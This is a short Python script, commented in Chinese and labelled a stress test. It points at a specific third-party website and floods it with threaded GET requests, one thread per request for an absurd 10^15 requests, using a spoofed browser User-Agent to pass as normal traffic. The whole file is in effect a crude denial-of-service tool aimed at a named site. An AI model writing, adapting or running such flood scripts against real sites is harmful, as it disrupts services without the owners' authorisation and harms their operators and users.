import requests
import threading
import time

# 目标 URL
target_url = "https://www.gzxbn.cn/"  # 请替换为你要测试的实际网址

# 请求头部，模拟正常请求
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}


# 发起请求的函数
def send_request():
    try:
        response = requests.get(target_url, headers=headers)
        print(f"Status Code: {response.status_code}, URL: {target_url}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")


# 线程函数
def stress_test(num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    # 设置发送请求的次数，测试压力
    num_requests = 1000000000000000  # 根据需要调整并发请求数
    print(f"Starting stress test with {num_requests} requests...")

    start_time = time.time()
    stress_test(num_requests)
    end_time = time.time()

    print(f"Test completed in {end_time - start_time:.2f} seconds.")